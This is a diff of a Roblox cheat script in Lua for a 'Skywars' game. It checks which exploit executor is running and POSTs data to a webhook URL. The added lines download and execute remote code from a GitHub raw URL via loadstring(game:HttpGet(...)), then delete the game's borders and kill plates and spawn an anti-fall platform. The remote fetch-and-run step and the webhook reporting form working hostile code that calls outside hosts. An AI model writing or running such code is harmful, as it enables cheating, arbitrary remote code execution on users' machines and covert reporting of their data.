@@ -1,26 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Freozzy/AntiHackDelete/main/Skywars", true))()
-wait(1)
-game.workspace.Borders.InvisibleBorder:remove()
-wait(0.1)
-game.workspace.Lobby.KillPlates:remove()
-wait(0.1)
-local BuildPart = Instance.new("Part",game.Workspace)
-BuildPart.Size = Vector3.new(500, 1, 500)
-BuildPart.Position = Vector3.new(25,160,-8)
-BuildPart.Anchored = true
-BuildPart.Name = "AntiFall"
-BuildPart.BrickColor = BrickColor.new("Bright bluish green")
-BuildPart.Material = Enum.Material.SmoothPlastic
-wait(1)
-local Brick = game.Workspace.AntiFall
-local speed = 1
-while true do
-	for i = 0,1,0.001*speed do
-		Brick.Color = Color3.fromHSV(i,1,1)
-		wait()
-	end
-end
-wait(1)
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
@@ -53,3 +30,17 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Freozzy/AntiHackDelete/main/Skywars", true))()
+wait(1)
+game.workspace.Borders.InvisibleBorder:remove()
+wait(0.1)
+game.workspace.Lobby.KillPlates:remove()
+wait(0.1)
+local BuildPart = Instance.new("Part",game.Workspace)
+BuildPart.Size = Vector3.new(500, 1, 500)
+BuildPart.Position = Vector3.new(25,160,-8)
+BuildPart.Anchored = true
+BuildPart.Name = "AntiFall"
+BuildPart.BrickColor = BrickColor.new("Bright bluish green")
+BuildPart.Material = Enum.Material.SmoothPlastic
